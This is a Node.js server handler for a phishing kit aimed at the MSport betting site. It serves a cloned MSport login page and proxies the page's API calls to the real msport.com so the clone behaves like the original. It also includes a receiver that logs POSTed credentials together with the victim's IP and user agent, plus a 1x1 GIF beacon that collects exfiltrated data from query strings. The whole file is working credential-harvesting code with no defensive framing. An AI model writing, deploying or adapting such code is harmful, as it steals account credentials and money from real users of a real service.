const LOGIN_HTML = require('./login_html.js');
const https = require('https');
const { URL } = require('url');

function clientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  return xff ? String(xff).split(',')[0].trim() : (req.socket && req.socket.remoteAddress) || 'unknown';
}

// Proxy the MSport web API so the cloned login page actually works.
// Page computes API base as location.origin + "/api/ng"  =>  /api/ng/patron/login
// We forward that to the real host.
function proxy(req, res, targetUrl) {
  const u = new URL(targetUrl);
  const headers = Object.assign({}, req.headers);
  headers['host'] = u.host;
  delete headers['content-length'];
  delete headers['connection'];

  const upstream = https.request(
    { protocol: u.protocol, hostname: u.hostname, port: u.port || 443,
      method: req.method, path: u.pathname + u.search, headers },
    (pr) => {
      const outHeaders = Object.assign({}, pr.headers);
      outHeaders['access-control-allow-origin'] = '*';
      res.writeHead(pr.statusCode || 502, outHeaders);
      pr.pipe(res);
    }
  );
  upstream.on('error', (e) => {
    res.status(502).json({ error: 'proxy_error', detail: String(e) });
  });
  req.pipe(upstream);
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.status(204).end();

  const parsed = new URL(req.url, 'http://localhost');
  const path = parsed.pathname || '';

  // ---- 1) MSport API proxy ----
  // Page computes base = location.origin + "/api/ng", so requests hit
  // /api/ng/patron/... on our host. Forward to the real host, same path.
  if (path.startsWith('/api/ng/')) {
    return proxy(req, res, 'https://www.msport.com' + path + parsed.search);
  }

  // ---- 2) Exfil receiver (POST /api) ----
  if (req.method === 'POST') {
    let body = '';
    await new Promise((resolve) => {
      req.on('data', (c) => { body += c; if (body.length > 2e6) req.destroy(); });
      req.on('end', resolve);
      req.on('error', resolve);
    });
    let payload = body;
    if (payload.startsWith('d=')) { try { payload = decodeURIComponent(payload.slice(2)); } catch (e) {} }
    const hit = { t: new Date().toISOString(), ip: clientIp(req), ua: req.headers['user-agent'], referer: req.headers['referer'] || '', body: payload };
    console.log('=== EXFIL HIT ===', JSON.stringify(hit));
    return res.status(200).json({ ok: true });
  }

  // ---- 3) 1x1 gif beacon ----
  if (parsed.searchParams.get('d')) {
    console.log('=== EXFIL BEACON ===', parsed.searchParams.get('d'));
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    res.setHeader('Cache-Control', 'no-store');
    return res.status(200).send(gif);
  }

  // ---- 4) Serve the cloned MSport login page ----
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store');
  return res.status(200).send(LOGIN_HTML);
};
